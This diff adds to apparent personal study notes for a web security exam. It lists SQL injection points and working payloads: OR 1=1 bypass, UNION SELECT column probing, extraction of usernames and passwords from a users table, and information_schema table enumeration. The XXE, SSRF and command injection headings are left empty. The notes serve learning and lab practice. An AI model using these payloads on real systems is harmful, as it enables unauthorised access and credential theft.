@@ -61,3 +61,37 @@ echo $cookie;
 session=%7b%22username%22%3anull%2c%22isloggedin%22%3afalse%7d--MCwCFBWsmuznMGBzRTveQHZaciakIfiiAhQ73vjIL0MIisP81SYi2t%2bfRkpHwg%3d%3d;
 url解码后变成
 session={"username":null,"isloggedin":false}--MCwCFBWsmuznMGBzRTveQHZaciakIfiiAhQ73vjIL0MIisP81SYi2t+fRkpHwg==;
+
+4. sql injection (重点考察点，最好多找些提做一些，看看是否用sqlmap可以不要太长时间跑出来，因为毕竟考试时间不太多)
+常见注入点: 
+ a. Product category filter
+ b. login function
+ c. cookie
+ 
+常用payload:
+'+OR+1=1--
+'+UNION+SELECT+NULL,NULL--  (union-base tech to figure out the number of columns)
+'+UNION+SELECT+'abcdef',NULL,NULL--  (union-base tech to find out which column support text)
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users-- (Return more than one columns value in one)
+上面几个payload就是先确定返回列数，再确定返回列的数据类型，最后再通过一些方法把多个列的值合并成一个返回
+
+
+如何确定数据库类型（主要是用于加快sqlmap，还是说sqlmap其实可以很快确定数据库类型？当然时间久一点sqlmap基本可以探测出来，只是考试时间一般不太多)
+On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, 
+you will still need to include the FROM keyword followed by a valid table name.
+There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual
+
+For mysql/MSSQL, you can use the following:
+'+UNION+SELECT+@@version,+NULL#
+
+Use the following payload to retrieve the list of tables in the database:(For Non Oracle DB)
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+
+5. XXE
+
+6. SSRF
+
+7. Command injection
+
+
+
